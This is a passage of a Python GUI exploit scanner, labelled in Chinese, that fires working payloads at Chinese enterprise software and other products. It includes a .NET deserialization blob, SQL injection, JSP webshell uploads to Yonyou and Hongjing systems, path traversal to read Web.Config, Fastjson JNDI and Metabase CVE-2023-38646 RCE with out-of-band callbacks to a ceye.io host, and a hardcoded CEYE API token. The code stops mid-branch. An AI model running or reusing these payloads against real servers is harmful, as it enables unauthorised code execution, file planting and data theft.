oKQZvAAAAGVN5c3RlbS5Cb29sZWFuIE1vdmVOZXh0KCkIAAAACgFKAAAAQgAAAAZwAAAAvQJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABnIAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQZzAAAAC2dldF9DdXJyZW50CgFLAAAAQwAAAAlzAAAACT4AAAAJcgAAAAZ2AAAAGVN5c3RlbS5UeXBlIGdldF9DdXJyZW50KCkGdwAAABlTeXN0ZW0uVHlwZSBnZXRfQ3VycmVudCgpCAAAAAoBTAAAAEIAAAAGeAAAAMYBU3lzdGVtLkZ1bmNgMltbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCT4AAAAKCT4AAAAGegAAABBTeXN0ZW0uQWN0aXZhdG9yBnsAAAAOQ3JlYXRlSW5zdGFuY2UKAU0AAABDAAAACXsAAAAJPgAAAAl6AAAABn4AAAApU3lzdGVtLk9iamVjdCBDcmVhdGVJbnN0YW5jZShTeXN0ZW0uVHlwZSkGfwAAAClTeXN0ZW0uT2JqZWN0IENyZWF0ZUluc3RhbmNlKFN5c3RlbS5UeXBlKQgAAAAKAU4AAAAPAAAABoAAAAAmU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5Db21tYW5kSUQEAAAACToAAAAQTwAAAAIAAAAJggAAAAgIACAAAASCAAAAC1N5c3RlbS5HdWlkCwAAAAJfYQJfYgJfYwJfZAJfZQJfZgJfZwJfaAJfaQJfagJfawAAAAAAAAAAAAAACAcHAgICAgICAgITE9J07irREYv7AKDJDyb3Cws=",
                        "format": "3"
                    }

                    self.append_to_output("===================================================================", "green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        #requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(main_url, headers=headers_one, json=post_data, verify=False, timeout=10, proxies=self.proxies)
                        res = req.text
                        if req.status_code == 200 and 'Windows IP' in res:
                            self.append_to_output(f"[+] {url} 存在 金蝶云星空管理中心存在反序列化命令执行！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在 金蝶云星空管理中心存在反序列化命令执行！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                            req = requests.post(main_url, headers=headers_two, json=post_data, verify=False, timeout=10,
                                                proxies=self.proxies)
                            res = req.text
                            if req.status_code == 200 and 'flags' in res:
                                self.append_to_output(f"[+] {url} 存在 金蝶云星空管理中心存在反序列化命令执行！！！！", "red")
                                self.append_to_output(res, "yellow")
                                with open("output.txt", "a") as file:
                                    file.write(f"[+] {url} 存在 金蝶云星空管理中心存在反序列化命令执行！！！！" + "\n")
                                    file.write(res + "\n")
                            else:
                                self.append_to_output(f"[-] {url} 不存在 金蝶云星空管理中心存在反序列化命令执行", "green")
                            #self.append_to_output(f"[-] {url} 不存在 金蝶云星空管理中心存在反序列化命令执行", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "40.Gibbon CVE-2023-34598":
                    if url.endswith("/"):
                        path = '?q=./gibbon.sql'
                    else:
                        path = '/?q=./gibbon.sql'

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
                        "Accept": "*/*",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "close"
                    }
                    self.append_to_output("===================================================================", "green")
                    try:
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.get(encodetext, headers=headers, verify=False, timeout=20, proxies=self.proxies)
                        res = req.text

                        if 'sql' in res:
                            self.append_to_output(f"[+] {url} 存在Gibbon CVE-2023-34598漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在Gibbon CVE-2023-34598漏洞！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在Gibbon CVE-2023-34598漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "41.泛微E-Cology SQL注入漏洞复现(QVD-2023-15672)":
                    if url.endswith("/"):
                        path = "weaver/weaver.file.FileDownloadForOutDoc/?fileid=123+WAITFOR+DELAY+'0:0:5'&isFromOutImg=1"
                    else:
                        path = "/weaver/weaver.file.FileDownloadForOutDoc/?fileid=123+WAITFOR+DELAY+'0:0:5'&isFromOutImg=1"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    self.append_to_output("===================================================================","green")
                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在泛微E-Cology SQL注入漏洞复现(QVD-2023-15672)！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在泛微E-Cology SQL注入漏洞复现(QVD-2023-15672)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "42.用友NC Cloud存在前台远程命令执行漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers_NC = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Connection": "close",
                        "Host": "127.0.0.1",
                        "Cache-Control": "max-age=0",
                        "Upgrade-Insecure-Requests": "1",
                        "Accept-Language": "zh-CN,zh;q=0.9",
                        "Cookie": "cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF.server",
                        "If-None-Match": 'W/"1571-1589211696000"',
                        "If-Modified-Since": "Mon, 11 May 2020 15:41:36 GMT",
                        "Content-Type": "application/x-www-form-urlencoded"
                    }
                    if url.endswith("/"):
                        path = "uapjs/jsinvoke/?action=invoke"
                    else:
                        path = "/uapjs/jsinvoke/?action=invoke"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    payload = {
                        "serviceName": "nc.itf.iufo.IBaseSPService",
                        "methodName": "saveXStreamConfig",
                        "parameterTypes": ["java.lang.Object", "java.lang.String"],
                        "parameters": ["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/823780482.jsp"]
                    }
                    data = json.dumps(payload)
                    self.append_to_output("===================================================================","green")
                    try:
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, headers=headers, data=data, verify=False, timeout=10, proxies=proxies)
                        res = req.text

                        if req.status_code == 200:
                            command = 'org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig").getInputStream())'
                            payload = {
                                "cmd": command
                            }
                            if url.endswith("/"):
                                path = "823780482.jsp?error=bsh.Interpreter"
                            else:
                                path = "/823780482.jsp?error=bsh.Interpreter"

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url = 'http://' + url
                            againurl = url + path
                            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                            reql = requests.post(againurl, headers=headers_NC, data=payload, verify=False, timeout=10, proxies=proxies)
                            resl = reql.text
                            if reql.status_code == 200:
                                self.append_to_output(f"[+] {url} 存在用友NC Cloud存在前台远程命令执行漏洞！！！！", "red")
                                self.append_to_output(resl, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在用友NC Cloud存在前台远程命令执行漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "43.HIKVISION-海康威视综合安防管理平台远程命令执行漏洞(Fastjson)":
                    # 替换成您的CEYE API信息
                    api_base_url = "http://api.ceye.io/v1"
                    api_token = "394eb5e86394352a6270dc6a60dc7848"
                    payload_id = "0uim95.ceye.io"

                    # 构建API请求的参数
                    params = {
                        "token": api_token,
                        "type": "dns",
                        "filter": payload_id
                    }

                    # 构建API请求的URL
                    request_url = f"{api_base_url}/records"

                    if url.endswith("/"):
                        path = "ebic/ssoService/v1/applyCT"
                    else:
                        path = "/bic/ssoService/v1/applyCT"
                    encodetext = url + path

                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    payload = {
                        "a": {
                            "@type": "java.lang.Class",
                            "val": "com.sun.rowset.JdbcRowSetImpl"
                        },
                        "b": {
                            "@type": "com.sun.rowset.JdbcRowSetImpl",
                            "dataSourceName": "ldap://0uim95.ceye.io",
                            "autoCommit": True
                        },
                        "hfe4zyyzldp": "="
                    }
                    headers = {
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Upgrade-Insecure-Requests": "1",
                        "Sec-Fetch-Dest": "document",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-Site": "cross-site",
                        "Sec-Fetch-User": "?1",
                        "Te": "trailers",
                        "Content-Type": "application/json"
                    }
                    self.append_to_output("===================================================================","green")
                    try:
                        response_ceye = requests.get(request_url, params=params, verify=False, proxies=None)
                        if response_ceye.status_code == 200:
                            data = response_ceye.json()
                            records = data.get("data", [])
                            id_count = len(records)

                            if id_count > 0:
                                self.append_to_output(f"[-] CEYE收到请求记录，共收到 {id_count} 个id属性记录。", "yellow")
                                self.append_to_output("[!] 请求记录列表：", "yellow")
                                for record in records:
                                    self.append_to_output(str(record), "yellow")
                            else:
                                self.append_to_output("[-] CEYE没有收到请求记录。", "yellow")

                        else:
                            self.append_to_output("[-] API请求失败。HTTP状态码：", response_ceye.status_code)

                        response = requests.post(encodetext, headers=headers, json=payload, verify=False, timeout=10, proxies=proxies)
                        res =response.text
                        if 'code' in res:
                            self.append_to_output(Fore.GREEN + f"[+] {url} 可能存在海康威视综合安防管理平台远程命令执行漏洞(Fastjson)，等待ceyelog日志确认！！！！", "red")
                            self.append_to_output(res, "yellow")

                            response_ceye = requests.get(request_url, params=params, verify=False, timeout=10, proxies=proxies)
                            if response_ceye.status_code == 200:
                                data = response_ceye.json()
                                records = data.get("data", [])
                                id_count_change = len(records)

                                if id_count_change > id_count:
                                    self.append_to_output(f"[!] CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认存在漏洞", "red")
                                    self.append_to_output("请求记录列表：", "yellow")
                                    for record in records:
                                        self.append_to_output(str(record), "yellow")
                                else:
                                    self.append_to_output(f"[-] CEYE没有收到请求记录，误报。", "green")

                            else:
                                self.append_to_output(f"[-] API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
                        else:
                            self.append_to_output(Fore.RED + f"[-] {url} 不存在海康威视综合安防管理平台远程命令执行漏洞(Fastjson)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，但是检测一下ceye是否有变化: {url}", "yellow")
                        response_ceye = requests.get(request_url, params=params, verify=False, timeout=10, proxies=proxies)
                        if response_ceye.status_code == 200:
                            data = response_ceye.json()
                            records = data.get("data", [])
                            id_count_change = len(records)

                            if id_count_change > id_count:
                                self.append_to_output(f"[!] CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认存在漏洞", "red")
                                self.append_to_output("[-] 请求记录列表：", "yellow")
                                for record in records:
                                    self.append_to_output(str(record), "yellow")
                                self.append_to_output(f"[+] 确认 {url} 存在海康威视综合安防管理平台远程命令执行漏洞(Fastjson)", "red")
                            else:
                                self.append_to_output("[-] CEYE没有收到请求记录，跳过这个URL。", "green")

                        else:
                            self.append_to_output(f"[-] API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "44.宏景eHR 任意文件上传漏洞":
                    if url.endswith("/"):
                        path = "w_selfservice/oauthservlet/"
                    else:
                        path = "/w_selfservice/oauthservlet/"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    base_url = url + path
                    relative_path = "../../system/options/customreport/OfficeServer.jsp"
                    full_url = base_url + relative_path

                    headers = {
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "close"
                    }
                    data = "DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ\nOPTION=U0FWRUZJTEU=\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\nFILETYPE=Li5cNjYuanNw\nRECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\noriginalFileId=wV66\noriginalCreateDate=wUghPB3szB3Xwg66\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\nneedReadFile=yRWZdAS6\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\n\n<%out.println(\"test\");%>"


                    self.append_to_output("===================================================================","green")
                    try:
                        # 创建不验证SSL证书的HTTPSHandler
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        https_handler = urllib.request.HTTPSHandler(context=context)
                        # 设置Burp代理
                        proxy_handler = urllib.request.ProxyHandler({'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
                        # 构建Opener
                        opener = urllib.request.build_opener(proxy_handler)
                        # 构建请求对象
                        request = urllib.request.Request(full_url, data=data.encode('utf-8'), headers=headers)
                        # 发送POST请求
                        response = opener.open(request)
                        result = str(response.read())
                        if response.getcode() == 200 and '21' in result or 'DBS' in result:
                            self.append_to_output(f"[+] {url} 存在宏景eHR 任意文件上传漏洞！！！！", "red")
                            self.append_to_output(result, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在宏景eHR 任意文件上传漏洞！！！！" + "\n")
                                file.write(result + "\n")
                        else:
                            if url.endswith("/"):
                                path = "66.jsp"
                            else:
                                path = "/66.jsp"

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url = 'http://' + url

                            encodetext = url + path
                            req_get = requests.get(encodetext, headers=headers, verify=False, timeout=5, proxies=proxies)
                            res_get = req_get.text
                            if req_get.status_code == 200:
                                self.append_to_output(f"[+] 通过直接访问 {url} 发现存在宏景eHR 任意文件上传漏洞！！！！", "red")
                                self.append_to_output(res, "yellow")
                            else:
                                self.append_to_output(f"[-] {url} 不存在宏景eHR 任意文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "45.用友GRP-U8 存在任意文件上传漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=..%2F&filename=94156577.jsp&filename=1.jpg"
                    else:
                        path = "/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=..%2F&filename=94156577.jsp&filename=1.jpg"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Connection": "keep-alive",
                        "Accept-Language": "zh-CN,zh;q=0.9",
                        "Cookie": "JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9",
                    }

                    data = '''--ec126a48c5b7676dce1b676f5251358f\r\nContent-Disposition: form-data; name="myfile"; filename="test.jpg"\r\n\r\n<% out.println("3135168535");%>\r\n--ec126a48c5b7676dce1b676f5251358f--'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text
                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 可能存在用友GRP-U8 存在任意文件上传漏洞！！！！", "yellow")
                            #self.append_to_output(res, "yellow")
                            self.append_to_output("发送请求包进行漏洞确认","green")
                            if url.endswith("/"):
                                path = "R9iPortal/94156577.jsp"
                            else:
                                path = "/R9iPortal/94156577.jsp"

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url = 'http://' + url
                            else:
                                url_new = url
                            end_newpath = url_new + path
                            try:
                                newreq = requests.get(end_newpath, timeout=10, verify=False, proxies=self.proxies)
                                newres = newreq.text
                                if newreq.status_code == 200 and '313516' in newres:
                                    self.append_to_output(f"[+] {end_newpath} 确认无误,存在漏洞！！！！", "red")
                                    self.append_to_output(f"[+] 返回数据为: {newres} ", "red")
                                    with open("output.txt", "a") as file:
                                        file.write(f"[+] {url} 存在用友GRP-U8 存在任意文件上传漏洞！！！！" + "\n")
                                        file.write(res + "\n")
                                else:
                                    self.append_to_output(f"[+] {end_newpath} 可能不存在漏洞！！！！", "green")
                            except Timeout:
                                self.append_to_output(f"[!] 寻找94156577.jsp文件请求超时，跳过URL: {end_newpath}", "yellow")
                            except Exception as e:
                                self.append_to_output(str(e), "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在用友GRP-U8 存在任意文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "46.畅捷通TPlus DownloadProxy.aspx 存在任意文件读取漏洞":

                    if url.endswith("/"):
                        path = "tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"
                    else:
                        path = "/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and 'configuration' in res:
                            self.append_to_output(f"[+] {url} 存在畅捷通TPlus DownloadProxy.aspx 存在任意文件读取漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在畅捷通TPlus DownloadProxy.aspx 存在任意文件读取漏洞！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在畅捷通TPlus DownloadProxy.aspx 存在任意文件读取漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "47.Metabase RCE漏洞(CVE-2023-38646)":
                    # 替换成您的CEYE API信息
                    api_base_url = "http://api.ceye.io/v1"
                    api_token = "394eb5e86394352a6270dc6a60dc7848"
                    payload_id = "0uim95.ceye.io"

                    # 构建API请求的参数
                    params = {
                        "token": api_token,
                        "type": "dns",
                        "filter": payload_id
                    }

                    # 构建API请求的URL
                    request_url = f"{api_base_url}/records"

                    if url.endswith("/"):
                        path = "api/session/properties"
                    else:
                        path = "/api/session/properties"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url
                    encodetext = url + path

                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
                        "Accept": "*/*",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "close"
                    }
                    self.append_to_output("===================================================================","green")
                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
                        res = req.text

                        if req.status_code == 200 :
                            # 定义用于匹配 "setup-token" 值的正则表达式模式
                            pattern = r'"setup-token":"([a-f0-9-]+)"'

                            # 使用正则表达式查找匹配的值
                            match = re.search(pattern, res)

                            # 检查是否找到匹配项，并提取值
                            if match:
                                setup_token_value = match.group(1)
                                self.append_to_output(f"token_value: {setup_token_value}", "yellow")
                                self.append_to_output(f"将token_value带入，进一步检测与认证", "yellow")
                                if url.endswith("/"):
                                    path = "api/setup/validate"
                                else:
                                    path = "/api/setup/validate"

                                encodetext_two = url + path
                                # 构建请求头和 JSON 数据
                                headers = {
                                    "Content-Type": "application/json",
                                }
                                json_data = {
                                    "token": setup_token_value,
                                    "details": {
                                        "is_on_demand": False,
                                        "is_full_sync": False,
                                        "is_sample": False,
                                        "cache_ttl": None,
                                        "refingerprint": False,
                                        "auto_run_queries": True,
                                        "schedules": {},
                                        "details": {
                                            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl 0uim95.ceye.io')\n$$--=x",
                                            "advanced-options": False,
                                            "ssl": True
                                        },
                                        "name": "test",
                                        "engine": "h2"
                                    }
                                }
                                try:
                                    response_ceye = requests.get(request_url, params=params, verify=False, proxies=None)
                                    if response_ceye.status_code == 200:
                                        data = response_ceye.json()
                                        records = data.get("data", [])
                                        id_count = len(records)

                                        if id_count > 0:
                                            self.append_to_output(f"CEYE收到请求记录，共收到 {id_count} 个id属性记录。", "yellow")
                                            self.append_to_output("请求记录列表：", "yellow")
                                            for record in records:
                                                self.append_to_output(str(record), "yellow")
                                        else:
                                            self.append_to_output("CEYE没有收到请求记录。")

                                    else:
                                        self.append_to_output("API请求失败。HTTP状态码：", response_ceye.status_code)

                                    response = requests.post(encodetext_two, headers=headers, json=json_data, verify=False, timeout=10, proxies=proxies)
                                    res = response.text
                                    if response.status_code == 400:
                                        time.sleep(10)
                                        response_ceye = requests.get(request_url, params=params, verify=False,timeout=10, proxies=proxies)
                                        if response_ceye.status_code == 200:
                                            data = response_ceye.json()
                                            records = data.get("data", [])
                                            id_count_change = len(records)

                                            if id_count_change > id_count:
                                                self.append_to_output(
                                                    f"CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认 {url} 存在漏洞", "red")
                                                self.append_to_output("请求记录列表：", "yellow")
                                                for record in records:
                                                    self.append_to_output(str(record), "yellow")
                                            else:
                                                self.append_to_output("CEYE没有收到请求记录，误报。", "green")

                                        else:
                                            self.append_to_output(f"API请求失败。HTTP状态码：{response_ceye.status_code}","green")
                                    else:
                                        self.append_to_output(Fore.RED + f"[-]{url}不存在Metabase RCE漏洞(CVE-2023-38646)","green")
                                except Timeout:
                                    self.append_to_output(f"[!] 请求超时，但是检测一下ceye是否有变化: {url}", "yellow")
                                    response_ceye = requests.get(request_url, params=params, verify=False, timeout=10,
                                                                 proxies=proxies)
                                    if response_ceye.status_code == 200:
                                        data = response_ceye.json()
                                        records = data.get("data", [])
                                        id_count_change = len(records)

                                        if id_count_change > id_count:
                                            self.append_to_output(f"CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认 {url} 存在漏洞","red")
                                            self.append_to_output("请求记录列表：", "yellow")
                                            for record in records:
                                                self.append_to_output(str(record), "yellow")
                                            self.append_to_output(f"确认 {url} 是存在Metabase RCE漏洞(CVE-2023-38646)", "red")
                                        else:
                                            self.append_to_output("CEYE没有收到请求记录，跳过这个URL。", "green")

                                    else:
                                        self.append_to_output(f"API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
                                except Exception as e:
                                    self.append_to_output(str(e))
                            else:
                                self.append_to_output(f"[-] {url} 未找到 setup-token 的值,不存在Metabase RCE漏洞(CVE-2023-38646)", "green")
                        else:
                            self.append_to_output(f"[-] {url} 不存在Metabase RCE漏洞(CVE-2023-38646)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "48.用友时空KSOA软件前台文件上传漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=1.jsp"
                    else:
                        path = "/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=1.jsp"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Connection": "keep-alive",
                        "Accept-Language": "zh-CN,zh;q=0.9",
                        "Cookie": "JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9",
                    }

                    data = '''<% out.println("hello"); %>'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
                        res = req.text
                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 可能存在用友时空KSOA软件前台文件上传漏洞！！！！", "yellow")
                            #self.append_to_output(res, "yellow")
                            self.append_to_output("发送请求包进行漏洞确认","green")
                            if url.endswith("/"):
                                path = "pictures/1.jsp"
                            else:
                                path = "/pictures/1.jsp"

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url = 'http://' + url
                            else:
                                url_new = url
                            end_newpath = url_new + path
                            try:
                                newreq = requests.get(end_newpath, timeout=10, verify=False, proxies=proxies)
                                newres = newreq.text
                                if newreq.status_code == 200 and 'hello' in newres:
                                    self.append_to_output(f"[+] {end_newpath} 确认无误,存在漏洞！！！！", "red")
                                    self.append_to_output(f"[+] 返回数据为: {newres} ", "red")
                                    with open("output.txt", "a") as file:
                                        file.write(f"[+] {url} 存在用友时空KSOA软件前台文件上传漏洞！！！！" + "\n")
                                        file.write(res + "\n")
                                else:
                                    self.append_to_output(f"[+] {end_newpath} 可能不存在漏洞！！！！", "green")
                            except Timeout:
                                self.append_to_output(f"[!] 寻找1.jsp文件请求超时，跳过URL: {end_newpath}", "yellow")
                            except Exception as e:
                                self.append_to_output(str(e), "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在用友时空KSOA软件前台文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "49.金蝶云星空任意文件读取漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
